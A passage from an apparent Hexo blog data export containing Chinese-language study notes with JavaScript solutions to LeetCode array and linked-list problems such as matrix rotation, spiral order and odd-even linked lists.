operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> len<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="旋转矩阵"><a href="#旋转矩阵" class="headerlink" title="旋转矩阵"></a>旋转矩阵</h2><ul><li><a href="https://leetcode-cn.com/problems/rotate-image/" target="_blank" rel="noopener">leetcode48</a></li></ul><blockquote><p>你必须在原地旋转图像，这意味着你需要直接修改输入的二维矩阵。请不要使用另一个矩阵来旋转图像。</p><p>示例 1:</p><p>给定 matrix =<br>[<br>  [1,2,3],<br>  [4,5,6],<br>  [7,8,9]<br>],</p><p>原地旋转输入矩阵，使其变为:<br>[<br>  [7,4,1],<br>  [8,5,2],<br>  [9,6,3]<br>]</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> rotate <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>matrix<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">const</span> len <span class="token operator">=</span> matrix<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">let</span> curr <span class="token operator">=</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            matrix<span class="token punctuation">[</span>len <span class="token operator">-</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>curr<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><ul><li>具体过程如下：</li></ul><pre class=" language-js"><code class="language-js"><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span></code></pre><h2 id="非递减数列"><a href="#非递减数列" class="headerlink" title="非递减数列"></a>非递减数列</h2><ul><li><p><a href="https://leetcode-cn.com/problems/non-decreasing-array/" target="_blank" rel="noopener">leetcode665</a></p></li><li><p><a href="https://leetcode-cn.com/problems/non-decreasing-array/solution/3-zhang-dong-tu-bang-zhu-ni-li-jie-zhe-d-06gi/" target="_blank" rel="noopener">题解</a></p></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> checkPossibility <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token number">1</span> <span class="token operator">||</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> nums<span class="token punctuation">[</span>i<span class="token number">-2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span>            <span class="token punctuation">}</span>            count <span class="token operator">++</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> count <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="顺时针打印矩阵"><a href="#顺时针打印矩阵" class="headerlink" title="顺时针打印矩阵"></a>顺时针打印矩阵</h2><ul><li><a href="https://leetcode-cn.com/problems/spiral-matrix/" target="_blank" rel="noopener">leetcode54</a></li><li><a href="https://leetcode-cn.com/problems/spiral-matrix/solution/shou-hui-tu-jie-liang-chong-bian-li-de-ce-lue-kan-/" target="_blank" rel="noopener">【手绘图解】两种遍历的策略，看你喜欢哪种</a></li></ul><pre class=" language-js"><code class="language-js">示例 <span class="token number">1</span>：输入：matrix <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">]</span>输出：<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>示例 <span class="token number">2</span>：输入：matrix <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">]</span>输出：<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> spiralOrder <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>matrix<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>matrix<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> top <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> bottom <span class="token operator">=</span> matrix<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> left <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> right <span class="token operator">=</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>top <span class="token operator">&lt;</span> bottom <span class="token operator">&amp;&amp;</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> left<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> right<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>top<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// 上层</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> top<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> bottom<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 右层</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> right<span class="token punctuation">;</span> i <span class="token operator">></span> left<span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>bottom<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 下层</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> bottom<span class="token punctuation">;</span> i <span class="token operator">></span> top<span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 左层</span>    right<span class="token operator">--</span>    top<span class="token operator">++</span>    bottom<span class="token operator">--</span>    left<span class="token operator">++</span>  <span class="token comment" spellcheck="true">// 四个边界同时收缩，进入内层</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>top <span class="token operator">===</span> bottom<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 剩下一行，从左到右依次添加</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> left<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> right<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>top<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">===</span> right<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 剩下一列，从上到下依次添加</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> top<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> bottom<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="最长湍流子数组"><a href="#最长湍流子数组" class="headerlink" title="最长湍流子数组"></a>最长湍流子数组</h2><ul><li><p><a href="https://leetcode-cn.com/problems/longest-turbulent-subarray/" target="_blank" rel="noopener">leetcode978</a></p></li><li><p><a href="https://leetcode-cn.com/problems/longest-turbulent-subarray/solution/mo-ni-dan-zhi-zhen-on-o1-by-xiaohaicai-7qy6/" target="_blank" rel="noopener">题解</a></p></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> maxTurbulenceSize <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> n <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">,</span>        maxNum <span class="token operator">=</span> Number<span class="token punctuation">.</span>MIN_SAFE_INTEGER<span class="token punctuation">,</span>        cur <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> arr<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            cur <span class="token operator">=</span> <span class="token number">1</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>i<span class="token number">-2</span><span class="token punctuation">]</span> <span class="token operator">>=</span> arr<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            cur<span class="token operator">++</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>i<span class="token number">-2</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> arr<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            cur<span class="token operator">++</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            cur <span class="token operator">=</span> <span class="token number">2</span>        <span class="token punctuation">}</span>        maxNum <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>maxNum<span class="token punctuation">,</span> cur<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> maxNum<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>链表</title>
      <link href="2020/11/13/%E7%AE%97%E6%B3%95-%E9%93%BE%E8%A1%A8/"/>
      <url>2020/11/13/%E7%AE%97%E6%B3%95-%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<ul><li>奇偶链表</li><li>旋转链表</li><li>两两交换链表元素</li><li>环形链表</li><li>环形链表2</li><li>删除链表的倒数第n个结点</li><li>合并两个有序链表</li><li>合并k个有序链表</li><li>链表反转</li><li>输出链表倒数第K个结点</li></ul><h2 id="奇偶链表"><a href="#奇偶链表" class="headerlink" title="奇偶链表"></a>奇偶链表</h2><ul><li><a href="https://leetcode-cn.com/problems/odd-even-linked-list" target="_blank" rel="noopener">leetcode328</a></li></ul><pre class=" language-js"><code class="language-js">给定一个单链表，把所有的奇数节点和偶数节点分别排在一起。请注意，这里的奇数节点和偶数节点指的是节点编号的奇偶性，而不是节点的值的奇偶性。请尝试使用原地算法完成。你的算法的空间复杂度应为 <span class="token function">O</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>，时间复杂度应为 <span class="token function">O</span><span class="token punctuation">(</span>nodes<span class="token punctuation">)</span>，nodes 为节点总数。示例 <span class="token number">1</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span>NULL输出<span class="token punctuation">:</span> <span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span>NULL示例 <span class="token number">2</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">6</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">7</span><span class="token operator">-</span><span class="token operator">></span>NULL 输出<span class="token punctuation">:</span> <span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">6</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">7</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span>NULL</code></pre><ul><li>思路：拆分链表再组合</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> oddEvenList <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> head    <span class="token keyword">let</span> odd <span class="token operator">=</span> head<span class="token punctuation">,</span> evenHead <span class="token operator">=</span> head<span class="token punctuation">.</span>next    <span class="token keyword">let</span> even <span class="token operator">=</span> evenHead    <span class="token keyword">while</span> <span class="token punctuation">(</span>even <span class="token operator">!==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> even<span class="token punctuation">.</span>next <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        odd<span class="token punctuation">.</span>next <span class="token operator">=</span> even<span class="token punctuation">.</span>next        odd <span class="token operator">=</span> odd<span class="token punctuation">.</span>next        even<span class="token punctuation">.</span>next <span class="token operator">=</span> odd<span class="token punctuation">.</span>next        even <span class="token operator">=</span> even<span class="token punctuation">.</span>next    <span class="token punctuation">}</span>    odd<span class="token punctuation">.</span>next <span class="token operator">=</span> evenHead    <span class="token keyword">return</span> head<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="旋转链表"><a href="#旋转链表" class="headerlink" title="旋转链表"></a>旋转链表</h2><ul><li><a href="https://leetcode-cn.com/problems/rotate-list" target="_blank" rel="noopener">leetcode61</a></li></ul><pre class=" language-js"><code class="language-js">给定一个链表，旋转链表，将链表每个节点向右移动 k 个位置，其中 k 是非负数。示例 <span class="token number">1</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span>NULL<span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">2</span>输出<span class="token punctuation">:</span> <span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span>NULL解释<span class="token punctuation">:</span>向右旋转 <span class="token number">1</span> 步<span class="token punctuation">:</span> <span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span>NULL向右旋转 <span class="token number">2</span> 步<span class="token punctuation">:</span> <span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span>NULL示例 <span class="token number">2</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token number">0</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span>NULL<span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">4</span>输出<span class="token punctuation">:</span> <span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">0</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span>NULL解释<span class="token punctuation">:</span>向右旋转 <span class="token number">1</span> 步<span class="token punctuation">:</span> <span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">0</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span>NULL向右旋转 <span class="token number">2</span> 步<span class="token punctuation">:</span> <span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">0</span><span class="token operator">-</span><span class="token operator">></span>NULL向右旋转 <span class="token number">3</span> 步<span class="token punctuation">:</span> <span class="token number">0</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span>NULL向右旋转 <span class="token number">4</span> 步<span class="token punctuation">:</span> <span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">0</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">1</span><span class="token 